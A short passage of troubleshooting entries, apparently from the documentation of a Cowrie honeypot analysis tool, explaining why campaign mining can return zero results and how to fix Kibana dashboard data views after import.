| `mine campaigns` → `campaigns_written: 0` | Behaviour mining needs IPs that run >=2 different playbooks (drop `_BEHAVIOUR_MIN_SUPPORT_IPS` in `campaigns.py` if your dataset is small). Infrastructure mining needs sessions with extractable URL / SSH-key / hash artifacts — pure brute-force traffic won't produce any. See [`docs/PLAYBOOKS_AND_CAMPAIGNS.md`](docs/PLAYBOOKS_AND_CAMPAIGNS.md). |
| Kibana dashboard import fails or panels show "no data" | The imported data views use the default index names. If any of `elasticsearch.indexes.cowrie.*` is not the default in your config, edit the data views after import: Stack Management → Data Views → find the view → update the index pattern title. |

---
